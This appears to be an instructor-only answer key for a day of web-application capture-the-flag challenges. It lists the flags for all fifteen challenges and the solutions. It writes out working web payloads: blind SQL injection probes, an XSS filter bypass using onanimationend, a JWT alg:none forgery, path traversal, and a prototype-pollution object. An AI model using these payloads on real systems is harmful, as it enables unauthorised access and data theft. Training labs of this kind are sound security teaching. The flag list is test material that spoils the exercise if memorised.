# Day 7 — Web Applications: Admin Solver Manual (v2.3)

> **Instructor use only.** Expected recoveries for the live Day 7 pack.

## Pack summary

| | |
|--|--|
| Count | **15** — 3 easy · 6 medium · **3 hard** · 3 danger |
| Day code | `WEB-2026` |
| Files | **None** |
| Flag model | All `is_dynamic` |

## Answer map

| # | ID | Title | Level | Answer |
|---|-----|-------|-------|--------|
| 1 | `d7_markup_trail` | Markup Trail | Easy | `ink_below` |
| 2 | `d7_side_door` | Side Door | Easy | `service_hatch` |
| 3 | `d7_desk_wizard` | Desk Wizard | Easy | `quiet_path` |
| 4 | `d7_role_chip` | Role Chip | Medium | `analyst_seat` |
| 5 | `d7_twin_check` | Twin Check | Medium | `both_match` |
| 6 | `d7_leaky_desk` | Leaky Desk | Medium | `desk_owner_note` |
| 7 | `d7_frame_whisper` | Frame Whisper | Medium | `posted_secret` |
| 8 | `d7_safe_shelf` | Safe Shelf | Medium | `shelf_escape_ok` |
| 9 | `d7_stash_order` | Stash Order | Medium | `abc_order` |
| 10 | `d7_blind_lookup` | Quiet Directory | Hard | `w7blindx` |
| 11 | `d7_strict_book` | Strict Guestbook | Hard | `strict_spill` |
| 12 | `d7_claim_ticket` | Claim Ticket | Hard | `forged_pass` |
| 13 | `d7_inherited_trust` | Inherited Trust | Danger | `chief_clearance` |
| 14 | `d7_cross_talk` | Cross Talk | Danger | `null_origin_ok` |
| 15 | `d7_flash_seat` | Flash Seat | Danger | `race_won` |

---

## Easy / Medium (short)

1. Markup Trail → `ink` + `_bel` + comment `ow`
2. Side Door → `/challenge/side-door/hatch` after lobby visit
3. Desk Wizard → walk / quiet / none → `sessionStorage d7_desk_recovery`
4. Role Chip → cookie role `analyst`
5. Twin Check → mirror `d7_pair`
6. Leaky Desk → `badge_issuer` **2701** → `internal_memo`
7. Frame Whisper → catch `postMessage`
8. Safe Shelf → `file=../secrets/desk_note.txt`
9. Stash Order → Network `alpha/beta/gamma` into `d7_stash_*`

---

## 10 · Quiet Directory (hard) — blind boolean oracle

RPC `d7_blind_lookup`. Responses: **User exists.** / **User not found.**

Secret recovery word (8 chars): **`w7blindx`**

Supported probe shapes (examples):

```
admin' AND SUBSTRING(flag,1,1)='w' --
admin' AND ASCII(SUBSTRING(flag,1,1))>100 --
admin' AND LENGTH(flag)=8 --
admin' AND flag LIKE 'w7%' --
```

True → "User exists." Loop positions 1..8 (or binary-search ASCII).

## 11 · Strict Guestbook (hard) — filtered XSS

`onerror` / `onload` / `onclick` / `onmouseover` / … blocked.
After login the page decrypts a vault into `window.__D7_STRICT` (seed `strict-vault`; Network only shows `reveal_hex`).

Working idea:

```html
<div style="animation:x 1s" onanimationend="document.body.append(window.__D7_STRICT)">x</div>
<style>@keyframes x{from{opacity:1}to{opacity:1}}</style>
```

(or `onpointerdown` / `onpointerenter` — also not scrubbed)

→ **`strict_spill`**

## 12 · Claim Ticket (hard) — alg:none forge

1. Issue guest ticket → three base64url parts in cookie `d7_claim`
2. Decode payload, set `"role":"admin"`
3. Set header `"alg":"none"` (verifier skips HMAC when alg is none)
4. Cookie = `header.payload.` (empty sig ok) → Open vault

→ **`forged_pass`**

---

## Danger (unchanged)

13. Inherited Trust → `{"constructor":{"prototype":{"deskRole":"chief"}}}` → `chief_clearance`  
14. Cross Talk → sandboxed `postMessage({elevate:true})` → `null_origin_ok`  
15. Flash Seat → 180ms guest→admin TOCTOU → `race_won`

---

## Instructor notes

- Day code: `WEB-2026`
- Blind secret is **only** in `challenge_answer_keys` / RPC — not in the JS bundle
- Migration: `supabase/migrations/20260713_0040_day7_hard_tier.sql`
